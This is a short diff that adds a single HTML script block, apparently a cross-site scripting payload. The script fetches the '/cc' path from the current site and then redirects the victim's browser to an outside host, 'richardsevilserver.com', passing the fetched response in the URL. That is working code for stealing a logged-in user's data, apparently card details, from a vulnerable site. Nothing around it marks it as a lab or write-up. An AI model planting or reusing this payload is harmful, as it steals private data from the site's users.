@@ -1,0 +1,8 @@
+<script>
+http = new XMLHttpRequest();
+http.open('GET', window.location.origin + '/cc');
+http.onreadystatechange = function () {
+    if (this.readyState !== 4) return; window.location=`http://richardsevilserver.com:8000?${encodeURIComponent(http.responseText)}`
+};
+http.send();
+</script>
